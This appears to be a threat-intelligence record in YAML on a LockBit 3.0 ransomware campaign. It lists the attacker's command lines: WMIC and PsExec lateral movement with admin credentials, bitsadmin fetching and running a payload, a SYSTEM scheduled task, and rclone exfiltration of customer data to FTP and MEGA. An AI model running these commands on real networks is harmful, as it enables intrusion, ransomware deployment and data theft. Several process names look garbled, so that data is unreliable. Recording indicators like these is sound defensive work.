description: A ransomware campaign leveraging LockBit 3.0 with extensive lateral movement,
  persistence via scheduled tasks and registry run keys, and exfiltration attempts
  using rclone.
attribution: APT group (unnamed), likely state-sponsored
malware_families:
- CobaltStrike
- SystemBC
- GhostSOCKS
- LockBit
- LockBit 3.0
- Cobalt Strike
TTPs:
  processes:
  - cmd.exe
  - PsExec.exe
  - wmiprvse.exe
  - bitsadmin
  - PSEXESVC.exe
  - schtasks
  - rundll32
  - ntpdutil
  - rclone.exe
  - COPY.bat
  - DEF.bat
  - ds.exe
  - setup_wm.exe
  - RDP.BAT
  - tailadvertisi
  - WMLBAT
  - COPYI1.BAT
  - EXEI.BAT
  - WMII.BAT
  - Psexec.exe
  - check.exe
  - Veeam-Get-Creds.psl
  commandline:
  - cmd.exe /c "%PUBLIC%\Music\SETUP.bat"
  - net session
  - net share share$=%PUBLIC%\Music /GRANT:Everyone,READ /Y
  - cmd.exe /c "%PUBLIC%\Music\WMI.bat" %PUBLIC%\Music\SETUP.bat %PUBLIC%\Music\COPY.bat
    %PUBLIC%\Music\DEF.bat %PUBLIC%\Music\ds.exe
  - wmic /node:ipv4address,REDACTED,REDACTED,REDACTED,REDACTED /user:"domain.local\\Administrator"
    /password:"REDACTED" process call create "cmd.exe /c bitsadmin /transfer update_service
    \\\\REDACTED\share$\\ds.exe %APPDATA%\ds.exe&%APPDATA%\ds.exe -pass REDACTED"
  - PsExec.exe /accepteula @comps1.txt -u "domain.local\\Administrator" -p "REDACTED"
    cmd /c COPY "\\\\REDACTED\share$\\ds.exe" "%WINDIR%\temp"
  - cmd.exe /c "%PUBLIC%\Music\share$\\COPY.bat" PsExec.exe /accepteula -d \\\\REDACTED
    -u "domain.local\\Administrator" -p "REDACTED" cmd /c COPY /Y "\\\\REDACTED\share$\\ds.exe"
    "%PUBLIC%\Music"
  - cmd.exe /c "C:\\share$\\EXE1.bat" C:\\share$\\PsExec.exe -d @C:\\share$\\comps1.txt
    -u "domain.local\\Administrator" -p "REDACTED" cmd /c %WINDIR%\temp\ds.exe -pass
    REDACTED
  - cmd.exe /c "C:\\share$\\WMI1.bat" wmic /node:@C:\\share$\\comps1.txt /user:"domain.local\\Administrator"
    /password:"REDACTED" process call create "cmd.exe /c bitsadmin /transfer ds \\\\REDACTED\share$\\ds.exe
    %APPDATA%\ds.exe&%APPDATA%\ds.exe -pass REDACTED"
  - wmiprvse.exe cmd.exe /c bitsadmin /transfer ds \\\\REDACTED\share$\\ds.exe %APPDATA%\ds.exe&%APPDATA%\ds.exe
    -pass REDACTED
  - schtasks /create /ru SYSTEM /sc ONSTART /tn Update2 /tr "cmd /c rundll32 %PUBLIC%\music\svcmc.dll,
    MainFunc"
  - rclone.exe copy E:\REDACTED\customers ftp1:REDACTED/customers -q --ignore-existing
    --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console
  - cmd.exe /C ".\\rclone.exe copy \"E:\\REDACTED\\domain\" mega:REDACTED/domain -q
    --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12
    --no-console"
  powershell:
  - Veeam-Get-Creds.psl
  scripting_engine: []
  registry_keys: []
  image_load: []
